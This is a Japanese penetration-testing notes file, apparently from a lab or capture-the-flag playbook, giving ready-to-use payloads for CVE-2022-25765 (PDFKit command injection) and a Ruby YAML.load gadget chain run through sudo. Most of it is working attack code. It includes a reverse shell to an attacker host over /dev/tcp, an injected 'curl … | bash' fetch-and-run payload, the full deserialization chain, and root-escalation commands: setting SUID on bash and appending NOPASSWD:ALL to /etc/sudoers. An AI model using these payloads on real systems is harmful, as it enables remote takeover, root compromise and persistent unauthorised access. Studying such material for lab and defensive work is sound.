# CVE メモ — 具体的ペイロード・バージョン対応表

汎用手法ファイル（`02_Initial_Access/` / `03_Post_Access_Linux/` 等）には書かない、
**特定のソフトウェア × バージョン限定の具体的ペイロード**をここに集約する。

手法クラスの「シグナル → 次の動作」は各手法ファイルを参照し、
ペイロードの詳細が必要になったときにここを開く。

---

## インデックス

| CVE | 対象 | 影響バージョン | 手法クラス | 参照先（手法ファイル） |
|-----|------|--------------|-----------|------------------|
| CVE-2022-25765 | PDFKit (Ruby gem) | 0.8.6 以下 | URL パラメータへのバックティック注入 → RCE | `../02_Initial_Access/Web_Vulnerabilities/Command_Injection.md` |
| Ruby YAML.load Psych Gadget Chain | Ruby 標準ライブラリ (Psych) | Ruby 2.x〜3.0 / `YAML.load` 使用時 | sudo スクリプト経由デシリアライゼーション → root RCE | `../03_Post_Access_Linux/Sudo_Misconfig.md`（パターン5） |

---

## CVE-2022-25765 — PDFKit バックティック URL 注入

**対象:** PDFKit gem 0.8.6 以下  
**手法クラス:** OSコマンドインジェクション（URL パラメータ経由）  
**参照:** `../02_Initial_Access/Web_Vulnerabilities/Command_Injection.md`（PDF生成機能のコマンドインジェクション セクション）

### ペイロード

**事前準備（必須）：**
1. リバースシェルスクリプトを HTTP サーバーで配信できる状態にする
2. nc リスナーを起動しておく

```bash
# [Kali] Step 1: リバースシェルスクリプトを作成
mkdir -p /tmp/www
cat > /tmp/www/rev.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1
EOF

# [Kali] Step 2: HTTP サーバー起動（スクリプト配信用）
cd /tmp/www
python3 -m http.server 8090

# [Kali] Step 3: 別ターミナルで nc リスナー起動
nc -lvnp 4444
```

**ブラウザの URL 入力フォームに貼り付けるペイロード:**
```
http://[ATTACKER_IP]:8090/?name= `curl http://[ATTACKER_IP]:8090/rev.sh|bash`
```

**curl で POST する場合（URL エンコード済み）:**
```bash
# [Kali]
curl -X POST http://[TARGET]/ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'url=http%3A%2F%2F[ATTACKER_IP]%3A8090%2F%3Fname%3D%2520%60curl%20http%3A%2F%2F[ATTACKER_IP]%3A8090%2Frev.sh%7Cbash%60'
```

**[ATTACKER_IP] は VPN 環境では tun0 の IP を使う（`ip addr show tun0` で確認）。**

### 確認されたバージョン
- PDFKit 0.8.6（Debian Bullseye / Ruby 2.7 環境で確認）
- PDFKit 0.8.7 以降はパッチ済み（URL サニタイズ修正）

---

## Ruby YAML.load Psych Gadget Chain — sudo スクリプト経由 root RCE

**対象:** Ruby 2.x〜3.0 / `YAML.load` を使うスクリプトを sudo NOPASSWD で実行できる環境  
**手法クラス:** デシリアライゼーション悪用（sudo 設定不備）  
**参照:** `../03_Post_Access_Linux/Sudo_Misconfig.md`（パターン5）  
**原理:** `../06_Concepts/YAML_Deserialization.md`

### ペイロード（悪意ある YAML ファイル）

**事前準備（必須）：**
- スクリプトが読み込むファイル名を `cat [スクリプトパス]` で確認する（例: `dependencies.yml`）
- そのファイルが置かれるパス（相対パスならカレントディレクトリ）に書き込み権限があることを確認する
- ファイルを作成するディレクトリに移動してから以下を実行する

```bash
# [Target] ファイル名はスクリプトの YAML.load 引数に合わせて変更する
# 'EOF' をシングルクォートで囲むことでヒアドキュメント内の ! が展開されない
cat << 'EOF' > [スクリプトが読み込むファイル名]
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: x
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/object:Gem::Installer
                     i: x
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
EOF
```

**`git_set:` の値が実行されるコマンド。** 目的に応じて変更する：

| やりたいこと | git_set の値 |
|------------|-------------|
| /bin/bash に SUID を設定（最もシンプル） | `"chmod +s /bin/bash"` |
| /tmp に SUID bash をコピー | `"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"` |
| sudoers に追記（永続的） | `"echo '[USER] ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"` |

**sudo 実行:**
```bash
# [Target] エラーが出ても途中でコマンドが走ることがある
sudo /usr/bin/ruby [スクリプトパス]

# SUID が設定されたか確認
ls -la /bin/bash
# -rwsr-sr-x ... → 成功

# root として実行
/bin/bash -p
```

**原状回復（必須）:**
```bash
# [Target] SUID を元に戻す
chmod -s /bin/bash

# 作成した YAML ファイルを削除
rm [ファイル名]
```

### 確認されたバージョン
- Ruby 2.7.4 / Rubygems 3.x（Debian Bullseye 環境で確認）
- Ruby 3.1 以降は `YAML.load` がデフォルトで安全なロードに変更されているため**動作しない**
  → `ruby --version` で確認してから試す
